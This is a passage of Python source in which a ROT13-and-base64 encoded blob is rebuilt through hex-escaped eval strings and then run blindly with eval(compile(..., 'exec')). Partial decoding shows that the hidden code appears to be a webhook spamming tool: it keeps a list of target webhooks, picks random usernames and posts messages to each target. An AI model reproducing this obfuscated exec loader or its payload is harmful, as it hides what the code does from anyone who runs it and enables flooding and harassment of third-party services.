PNtVPq1p2IlozSgMFp6VTAbo2ywMFumMKE0nJ5ap1faq2IvnT9in19mpTSgW11oW3ImMKWhLJ1yplqqXFjAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPqwo250MJ50WmbtL2uinJAyXUAyqUEcozqmJlq3MJWbo29eK3AjLJ0aKIfaL29hqTIhqUZaKFxfQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNaLKMuqTSlK3IloPp6VTAbo2ywMFumMKE0nJ5ap1faq2IvnT9in19mpTSgW11oW3OzpS91pzkmW10cQDbtVPNtVPNtVPNtVPNtVPNtVPNtVU0APvNtVPNtVPNtVPNtVPNtVPNtVPNtpF5jqKDbXUWypKIyp3EmYaOip3DfVUqyLzuio2gsqTSlM2I0p1glLJ5xpzShM2HbqTSlM2I0K2kcp3EsoTIhM3EbXI0hqKWfYPOsnTIuMTIlpljtpTS5oT9uMPxcQDbtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVPNtVTIfnJLtoTIhXTSlM3ZcVQ4tZPOuozDtLKWap1fjKF5cp2EcM2y0XPxtLJ5xVTyhqPuupzqmJmOqXFN8CFO3MJWbo29ep19fMJ5aqTt6QDbtVPNtVPNtVPNtVPNtVPNtMz9lVTxtnJ4tpzShM2HbnJ50XTSlM3AoZS0cXGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtq2IvnT9in190LKWaMKEmYzSjpTIhMPu3MJWbo29epl5jo3NbpzShMUWuozqyXUqyLzuio2gmK2kyozq0nPxcXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPO3MJWbo29ep19fMJ5aqTttYG0tZD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOfo2SxMJEsoTIhM3EbVPf9VQRAPvNtVPNtVPNtVPNtVTIfnJLtLKWap1fjKFN9CFNaoTymqPp6QDbtVPNtVPNtVPNtVPNtVPNtnJLtoTIhXTSlM3ZcVQjtZwbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtLKWapl5upUOyozDbWmRaXD0XVPNtVPNtVPNtVPNtVPNtVTS3LJy0VTIgLzIxXTA0rPjtLKWap1fkKFjtW1EupzqyqUZto24tLKE0LJAenJ5aVTkcp3DaYPO3MJWbo29eK3EupzqyqUZcQDbtVPNtVPNtVPNtVPOyoTyzVTSlM3AoZS0tCG0tW29zMzkiLJDaBt0XVPNtVPNtVPNtVPNtVPNtVUqyLzuio2gsqTSlM2I0plN9VSgqQDbtVPNtVPNtVPNtVPNtVPNtLKqunKDtoT9aXTA0rPjtMvqOoTjtq2IvnT9in3ZtnTS2MFOvMJIhVT9zMzkiLJEyMPpcQDbtVPNtVPNtVPNtVPOyoUAyBt0XVPNtVPNtVPNtVPNtVPNtVTMipvO3MJWbo29eVTyhVTSlM3Z6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVUqyLzuio2ftCFOwo250LJyhnJ5aXTS3LJy0VUAyoTIwqTIxK3AypaMypv53MJWbo29epltcYPO3MJWbo29eXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvO3MJWbo29eVTymVR5iozH6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOuq2ScqPOfo2pbL3E4YPOzW1IhLJWfMFO0olOznJ5xVUqyLzuio2ftLUg3MJWbo29esJNhWlxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTAioaEcoaIyQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUqyLzuio2gsqTSlM2I0pl5upUOyozDbq2IvnT9inlxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtoT9uMTIxK2kyozq0nPNeCFNkQDbAPvNtVPNtVPNtVPNtVTyzVTSlM3AoZS0tVG0tW2kcp3Da'
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))